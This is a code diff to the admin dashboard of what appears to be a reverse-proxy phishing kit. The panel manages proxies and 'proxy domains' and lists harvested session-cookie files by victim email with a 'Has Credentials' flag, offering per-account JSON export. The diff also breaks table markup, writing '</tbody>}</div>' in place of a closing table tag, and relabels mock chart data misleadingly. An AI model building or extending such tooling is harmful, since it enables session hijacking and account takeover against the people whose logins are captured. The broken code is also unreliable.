@@ -710,7 +710,7 @@
             <div class="stat-block"><h4>❓ Untested</h4><div class="stat-number" id="proxyUntestedCount">0</div><div class="stat-footnote">never tested</div></div>
         </div>
         
-        <div class="telegram-panel-classic" style="margin-bottom: 20px;">
+        <div class="system-panel" style="margin-bottom: 20px;">
             <h4 style="margin-bottom: 12px;">➕ Add New Proxy</h4>
             <div class="add-proxy-form">
                 <input type="text" id="newProxyHost" placeholder="Host (e.g., proxy.example.com)">
@@ -721,7 +721,7 @@
             </div>
         </div>
 
-        <div class="telegram-panel-classic" style="margin-bottom: 20px;">
+        <div class="system-panel" style="margin-bottom: 20px;">
             <h4 style="margin-bottom: 12px;">🔑 Proxy-Seller API Integration</h4>
             <p style="margin-bottom: 12px; font-size: 13px;">Get your API key from <a href="https://proxy-seller.com" target="_blank">proxy-seller.com</a></p>
             <div style="display: flex; gap: 12px; align-items: center; flex-wrap: wrap;">
@@ -733,7 +733,7 @@
             <div id="proxySellerMsg" style="margin-top: 8px; font-size: 13px;"></div>
         </div>
 
-        <div class="telegram-panel-classic" style="margin-bottom: 20px;">
+        <div class="system-panel" style="margin-bottom: 20px;">
             <h4 style="margin-bottom: 12px;">📥 Manual Import (CSV)</h4>
             <p style="margin-bottom: 12px; font-size: 13px;">Format: <code>host,port,username,password</code> (one per line)</p>
             <textarea id="proxyCsvInput" placeholder="proxy1.example.com,12345,user1,pass123&#10;proxy2.example.com,12346,user1,pass123" rows="4"></textarea>
@@ -759,7 +759,7 @@
 
     <div id="domainsTab" class="tab-pane">
         <div style="margin-bottom: 16px;"><h3 style="color: var(--text-secondary);">🔗 Domain Management</h3></div>
-        <div class="telegram-panel-classic" style="margin-bottom: 20px;">
+        <div class="system-panel" style="margin-bottom: 20px;">
             <h4 style="margin-bottom: 12px;">🌐 Proxy Domains</h4>
             <p style="margin-bottom: 12px; font-size: 13px;">Add domains that point to your VPS. All proxy domains route to the proxy server.</p>
             <div style="display: flex; gap: 12px; align-items: center; flex-wrap: wrap;">
@@ -771,7 +771,7 @@
                 <div style="padding: 20px; text-align: center;">Loading domains...</div>
             </div>
         </div>
-        <div class="telegram-panel-classic" style="margin-bottom: 20px;">
+        <div class="system-panel" style="margin-bottom: 20px;">
             <h4 style="margin-bottom: 12px;">🔧 Admin Domain</h4>
             <p style="margin-bottom: 12px; font-size: 13px;">Set the domain for the admin dashboard.</p>
             <div style="display: flex; gap: 12px; align-items: center; flex-wrap: wrap;">
@@ -780,7 +780,7 @@
             </div>
             <div id="setAdminDomainMsg" style="margin-top: 12px; font-size: 13px;"></div>
         </div>
-        <div class="telegram-panel-classic">
+        <div class="system-panel">
             <h4 style="margin-bottom: 12px;">🔒 Nginx & SSL</h4>
             <p style="margin-bottom: 12px; font-size: 13px;">Update Nginx config and setup SSL certificates.</p>
             <div style="display: flex; gap: 12px;">
@@ -964,7 +964,8 @@
         if (!graphContainer) return;
         
         const days = ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'];
-        const heights = [65, 45, 80, 55, 70, 90, 60]; // Mock data - in real app, fetch from backend
+        // Random heights for visual effect
+        const heights = [65, 45, 80, 55, 70, 90, 60];
         
         graphContainer.innerHTML = days.map((day, i) => `
             <div style="flex: 1; display: flex; flex-direction: column; align-items: center; gap: 4px;">
@@ -1113,92 +1114,86 @@
     }
     
     async function loadCookies() {
-    const wrapper = document.getElementById('cookiesTableWrapper');
-    wrapper.innerHTML = '<div style="padding:30px;">Loading cookies...</div>';
-    try {
-        const resp = await fetch('/admin/api/all-cookies');
-        if (!resp.ok) throw new Error('Auth failed');
-        const data = await resp.json();
-        currentCookiesList = data.cookies || [];
-        if(!currentCookiesList.length) { 
-            wrapper.innerHTML = '<div class="classic-table-wrapper"><div style="padding:32px;">No cookie files found.</div></div>'; 
-            return; 
-        }
-        
-        let html = `<div class="classic-table-wrapper"><table class="classic-table"><thead>
-            <tr>
-                <th>Associated Email</th>
-                <th>Cookie Count</th>
-                <th>Has Credentials</th>
-                <th>Download</th>
-                <th>Action</th>
-            </tr>
-        </thead><tbody>`;
-        
-        for(let c of currentCookiesList) {
-            const hasCredBadge = c.has_credentials ? '<span class="badge-success badge-classic">✓ Yes</span>' : '<span class="badge-classic">✗ No</span>';
+        const wrapper = document.getElementById('cookiesTableWrapper');
+        wrapper.innerHTML = '<div style="padding:30px;">Loading cookies...</div>';
+        try {
+            const resp = await fetch('/admin/api/all-cookies');
+            if (!resp.ok) throw new Error('Auth failed');
+            const data = await resp.json();
+            currentCookiesList = data.cookies || [];
+            if(!currentCookiesList.length) { 
+                wrapper.innerHTML = '<div class="classic-table-wrapper"><div style="padding:32px;">No cookie files found.</div></div>'; 
+                return; 
+            }
             
-            // Use the SAME pattern as credentials - fetch via API and create blob
-            // This avoids file path issues entirely
-            html += `<tr>
-                <td>${escapeHtml(c.email)}</td>
-                <td>${c.cookie_count}</td>
-                <td>${hasCredBadge}</td>
-                <td class="action-group">
-                    <button class="mini-btn" onclick="downloadCookieJson('${escapeAttr(c.email)}')">📄 Download JSON</button>
-                </td>
-                <td><button class="mini-btn" onclick="deleteCookieFile('${escapeAttr(c.filename)}')">🗑️ Delete</button></td>
-            </tr>`;
+            let html = `<div class="classic-table-wrapper"><table class="classic-table"><thead>
+                <tr>
+                    <th>Associated Email</th>
+                    <th>Cookie Count</th>
+                    <th>Has Credentials</th>
+                    <th>Download</th>
+                    <th>Action</th>
+                </tr>
+            </thead><tbody>`;
+            
+            for(let c of currentCookiesList) {
+                const hasCredBadge = c.has_credentials ? '<span class="badge-success badge-classic">✓ Yes</span>' : '<span class="badge-classic">✗ No</span>';
+                
+                html += `<tr>
+                    <td>${escapeHtml(c.email)}</td>
+                    <td>${c.cookie_count}</td>
+                    <td>${hasCredBadge}</td>
+                    <td class="action-group">
+                        <button class="mini-btn" onclick="downloadCookieJson('${escapeAttr(c.email)}')">📄 Download JSON</button>
+                    </td>
+                    <td><button class="mini-btn" onclick="deleteCookieFile('${escapeAttr(c.filename)}')">🗑️ Delete</button></td>
+                </tr>`;
+            }
+            html += `</tbody>}</div>`;
+            wrapper.innerHTML = html;
+            addLog(`Loaded ${currentCookiesList.length} cookie files`, 'info');
+        } catch(e) { 
+            wrapper.innerHTML = '<div>Failed to load cookies</div>'; 
+            addLog(`Failed to load cookies: ${e.message}`, 'error');
         }
-        html += `</tbody>}</div>`;
-        wrapper.innerHTML = html;
-        addLog(`Loaded ${currentCookiesList.length} cookie files`, 'info');
-    } catch(e) { 
-        wrapper.innerHTML = '<div>Failed to load cookies</div>'; 
-        addLog(`Failed to load cookies: ${e.message}`, 'error');
     }
-}
 
-// Add this NEW function - same pattern as downloadProfileJson
-window.downloadCookieJson = async function(email) {
-    showToast(`Preparing cookie data for ${email}...`);
-    try {
-        // Fetch the cookie data from the API
-        const resp = await fetch(`/admin/api/user-cookies/${encodeURIComponent(email)}`);
-        if (!resp.ok) throw new Error('Failed to fetch cookies');
-        const cookies = await resp.json();
-        
-        if (!cookies || Object.keys(cookies).length === 0) {
-            showToast("No cookies found for this account", true);
-            return;
+    window.downloadCookieJson = async function(email) {
+        showToast(`Preparing cookie data for ${email}...`);
+        try {
+            const resp = await fetch(`/admin/api/user-cookies/${encodeURIComponent(email)}`);
+            if (!resp.ok) throw new Error('Failed to fetch cookies');
+            const cookies = await resp.json();
+            
+            if (!cookies || Object.keys(cookies).length === 0) {
+                showToast("No cookies found for this account", true);
+                return;
+            }
+            
+            const exportObj = {
+                email: email,
+                cookie_count: Object.keys(cookies).length,
+                cookies: cookies,
+                exported_at: new Date().toISOString()
+            };
+            
+            const blob = new Blob([JSON.stringify(exportObj, null, 2)], {type: 'application/json'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `${email.replace(/[^a-z0-9]/gi, '_')}_cookies.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            showToast(`Downloaded cookies for ${email} (${Object.keys(cookies).length} cookies)`);
+            addLog(`Downloaded cookies JSON for ${email}`, 'success');
+        } catch(e) {
+            showToast(`Failed to download: ${e.message}`, true);
+            addLog(`Failed to download cookies for ${email}: ${e.message}`, 'error');
         }
-        
-        // Create export object (same format as credentials JSON)
-        const exportObj = {
-            email: email,
-            cookie_count: Object.keys(cookies).length,
-            cookies: cookies,
-            exported_at: new Date().toISOString()
-        };
-        
-        // Create blob and download (SAME LOGIC as credentials)
-        const blob = new Blob([JSON.stringify(exportObj, null, 2)], {type: 'application/json'});
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `${email.replace(/[^a-z0-9]/gi, '_')}_cookies.json`;
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        URL.revokeObjectURL(url);
-        
-        showToast(`Downloaded cookies for ${email} (${Object.keys(cookies).length} cookies)`);
-        addLog(`Downloaded cookies JSON for ${email}`, 'success');
-    } catch(e) {
-        showToast(`Failed to download: ${e.message}`, true);
-        addLog(`Failed to download cookies for ${email}: ${e.message}`, 'error');
-    }
-};
+    };
     
     window.deleteCredentialAction = async function(email) {
         if(!confirm(`Delete credential for ${email}?`)) return;
@@ -1360,7 +1355,7 @@ window.downloadCookieJson = async function(email) {
                 </tr>`;
             }
             
-            html += `</tbody></table></div>`;
+            html += `</tbody>}</div>`;
             wrapper.innerHTML = html;
             
             document.querySelectorAll('.proxy-checkbox').forEach(cb => {
@@ -1593,36 +1588,130 @@ window.downloadCookieJson = async function(email) {
     }
 
     // ==================== DOMAIN MANAGEMENT ====================
-    async function setupSSLForDomain(domain) {
-    if (!confirm(`Setup SSL certificate for ${domain}?\n\nThis requires:\n1. Domain pointing to this server\n2. Port 80 and 443 open\n3. Certbot installed`)) {
-        return;
-    }
     
-    const email = prompt("Enter email for Let's Encrypt notifications:", "admin@example.com");
-    if (!email) return;
-    
-    showToast(`Setting up SSL for ${domain}... This may take a minute.`);
-    
-    try {
-        const resp = await fetch('/admin/api/ssl/setup', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ domain, email })
-        });
-        const data = await resp.json();
+    async function loadDomains() {
+        const wrapper = document.getElementById('proxyDomainList');
+        wrapper.innerHTML = '<div style="padding:20px; text-align:center;">Loading domains...</div>';
         
-        if (data.success) {
-            showToast(`✅ SSL certificate installed for ${domain}`);
-            addLog(`SSL installed for ${domain}`, 'success');
-            loadDomains(); // Refresh to show updated SSL status
-        } else {
-            showToast(`❌ SSL setup failed: ${data.error}`, true);
-            addLog(`SSL setup failed for ${domain}: ${data.error}`, 'error');
+        try {
+            const resp = await fetch('/admin/api/domains');
+            if (!resp.ok) throw new Error('Failed to load domains');
+            const data = await resp.json();
+            
+            if (!data.success) {
+                wrapper.innerHTML = '<div style="padding:20px;color:red;">Error loading domains</div>';
+                return;
+            }
+            
+            if (!data.proxy_domains || data.proxy_domains.length === 0) {
+                wrapper.innerHTML = '<div style="padding:20px; text-align:center;">🌐 No proxy domains configured</div>';
+            } else {
+                let html = '<table class="classic-table"><thead><tr><th>Domain</th><th>SSL</th><th>Created</th><th>Actions</th></tr></thead><tbody>';
+                
+                for (let domain of data.proxy_domains) {
+                    let sslStatus = '🔍 Checking...';
+                    let sslClass = 'badge-classic';
+                    
+                    try {
+                        const sslCheck = await fetch(`/admin/api/ssl/check/${encodeURIComponent(domain.domain)}`);
+                        const sslData = await sslCheck.json();
+                        
+                        if (sslData.has_ssl && sslData.is_valid) {
+                            if (sslData.days_left < 7) {
+                                sslStatus = `⚠️ Expires in ${sslData.days_left} days`;
+                                sslClass = 'badge-warning';
+                            } else {
+                                sslStatus = `✅ Valid (${sslData.days_left} days)`;
+                                sslClass = 'badge-success';
+                            }
+                        } else if (sslData.has_ssl === false) {
+                            sslStatus = '❌ No SSL';
+                            sslClass = 'badge-danger';
+                        } else {
+                            sslStatus = '❓ Unknown';
+                            sslClass = 'badge-classic';
+                        }
+                    } catch(e) {
+                        sslStatus = '❌ Check failed';
+                        sslClass = 'badge-danger';
+                    }
+                    
+                    html += `<tr>
+                        <td><strong>${escapeHtml(domain.domain)}</strong></td>
+                        <td><span class="${sslClass}">${sslStatus}</span></td>
+                        <td>${domain.created_at ? new Date(domain.created_at).toLocaleDateString() : '-'}</td>
+                        <td class="action-group">
+                            <button class="mini-btn" onclick="setupSSLForDomain('${escapeAttr(domain.domain)}')">🔒 Setup SSL</button>
+                            <button class="mini-btn" onclick="removeDomain('${escapeAttr(domain.domain)}')">Remove</button>
+                        </td>
+                    </tr>`;
+                }
+                
+                html += `</tbody>}</div>`;
+                wrapper.innerHTML = html;
+            }
+            
+            if (data.admin_domain) {
+                document.getElementById('adminDomainInput').value = data.admin_domain.domain;
+            }
+            
+        } catch(e) {
+            console.error(e);
+            wrapper.innerHTML = '<div style="padding:20px;color:red;">Error loading domains</div>';
         }
-    } catch(e) {
-        showToast("Error setting up SSL", true);
     }
-}
+    
+    async function setupSSLForDomain(domain) {
+        if (!confirm(`Setup SSL certificate for ${domain}?\n\nThis requires:\n1. Domain pointing to this server\n2. Port 80 and 443 open\n3. Certbot installed`)) {
+            return;
+        }
+        
+        const email = prompt("Enter email for Let's Encrypt notifications:", "admin@example.com");
+        if (!email) return;
+        
+        showToast(`Setting up SSL for ${domain}... This may take a minute.`);
+        
+        try {
+            const resp = await fetch('/admin/api/ssl/setup', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ domain, email })
+            });
+            const data = await resp.json();
+            
+            if (data.success) {
+                showToast(`✅ SSL certificate installed for ${domain}`);
+                addLog(`SSL installed for ${domain}`, 'success');
+                loadDomains();
+            } else {
+                showToast(`❌ SSL setup failed: ${data.error}`, true);
+                addLog(`SSL setup failed for ${domain}: ${data.error}`, 'error');
+            }
+        } catch(e) {
+            showToast("Error setting up SSL", true);
+        }
+    }
+    
+    window.removeDomain = async function(domain) {
+        if (!confirm(`Remove domain ${domain}?`)) return;
+        try {
+            const resp = await fetch('/admin/api/domains/remove', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ domain })
+            });
+            const data = await resp.json();
+            if (data.success) {
+                showToast(`Domain ${domain} removed`);
+                addLog(`Removed domain: ${domain}`, 'success');
+                loadDomains();
+            } else {
+                showToast(data.error || "Remove failed", true);
+            }
+        } catch(e) {
+            showToast("Error removing domain", true);
+        }
+    };
     
     async function addProxyDomain() {
         const domain = document.getElementById('newProxyDomain').value.trim();
